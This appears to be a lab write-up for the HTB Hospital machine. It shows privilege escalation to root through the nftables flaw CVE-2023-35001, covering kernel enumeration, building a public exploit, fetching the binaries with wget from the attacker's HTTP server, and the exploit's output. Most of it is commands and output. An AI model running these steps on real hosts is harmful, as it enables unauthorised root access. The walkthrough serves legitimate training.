# CVE-2023-35001

## Enumeration

> nftables oob read/write exploit (CVE-2023-35001)

Exploit used at pwn2own Vancouver 2023 on Ubuntu desktop. The exploit supports the kernel version available at the beginning of the event (5.19.0-35).

```bash
www-data@webserver:/tmp$ uname -a
uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

```bash
www-data@webserver:/tmp$ cat /etc/os-release
PRETTY_NAME="Ubuntu 23.04"
NAME="Ubuntu"
VERSION_ID="23.04"
VERSION="23.04 (Lunar Lobster)"
...
```

## build the PoC

[PoC exploit](https://github.com/synacktiv/CVE-2023-35001)

```bash
$ git clone https://github.com/synacktiv/CVE-2023-35001    
Cloning into 'CVE-2023-35001'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 9 (delta 0), reused 9 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), 13.02 KiB | 833.00 KiB/s, done.
```

```bash
$ cd CVE-2023-35001
```

```bash
$ ls
go.mod  go.sum  main.go  Makefile  README.md  src
```

```bash
$ make
go build
go: downloading golang.org/x/sys v0.0.0-20211205182925-97ca703d548d
go: downloading github.com/google/nftables v0.0.0-20220611213346-a346d51f53b3
go: downloading github.com/vishvananda/netns v0.0.0-20180720170159-13995c7128cc
go: downloading github.com/mdlayher/netlink v1.4.2
go: downloading github.com/josharian/native v0.0.0-20200817173448-b6b71def0850
go: downloading github.com/mdlayher/socket v0.0.0-20211102153432-57e3fa563ecb
go: downloading golang.org/x/net v0.0.0-20211209124913-491a49abca63
gcc -Wall -Wextra -Werror -std=c99 -Os -g0 -D_GNU_SOURCE -D_DEFAULT_SOURCE -D_POSIX_C_SOURCE=200809L src/wrapper.c -o wrapper
zip lpe.zip exploit wrapper
  adding: exploit (deflated 42%)
  adding: wrapper (deflated 83%)
```

## Transfer files

Transfer files `exploit` and `wrapper` to the target.

```bash
$ python3 -m http.server 8181
Serving HTTP on 0.0.0.0 port 8181 (http://0.0.0.0:8181/) ...
```

```bash
root@webserver:/tmp$ wget 10.10.14.8:8181/exploit
--2024-08-22 10:02:25--  http://10.10.14.8:8181/exploit
Connecting to 10.10.14.8:8181... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3137336 (3.0M) [application/octet-stream]
Saving to: ‘exploit’
exploit             100%[===================>]   2.99M  1.13MB/s    in 2.6s    
2024-08-22 10:02:28 (1.13 MB/s) - ‘exploit’ saved [3137336/3137336]
```

```bash
root@webserver:/tmp$ wget 10.10.14.8:8181/wrapper
--2024-08-22 10:02:37--  http://10.10.14.8:8181/wrapper
Connecting to 10.10.14.8:8181... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16304 (16K) [application/octet-stream]
Saving to: ‘wrapper’
wrapper             100%[===================>]  15.92K  --.-KB/s    in 0.09s   
2024-08-22 10:02:38 (175 KB/s) - ‘wrapper’ saved [16304/16304]
```

```bash
$ python3 -m http.server 8181
Serving HTTP on 0.0.0.0 port 8181 (http://0.0.0.0:8181/) ...
10.10.11.241 - - [20/Aug/2024 05:04:29] "GET /exploit HTTP/1.1" 200 -
10.10.11.241 - - [20/Aug/2024 05:04:41] "GET /wrapper HTTP/1.1" 200 -
```

## Exploit

```bash
www-data@webserver:/tmp$ chmod +x exploit wrapper

www-data@webserver:/tmp$ ./exploit
./exploit
[+] Using config: 5.19.0-35-generic
[+] Recovering module base
[+] Module base: 0xffffffffc0592000
[+] Recovering kernel base
[+] Kernel base: 0xffffffffb0600000
[+] Got root !!!
# id
id
uid=0(root) gid=0(root) groups=0(root)
```

## Links

- [GitHub - PoC - synacktiv](https://github.com/synacktiv/CVE-2023-35001)
- [HTB Hospital machine](https://app.hackthebox.com/machines/576)
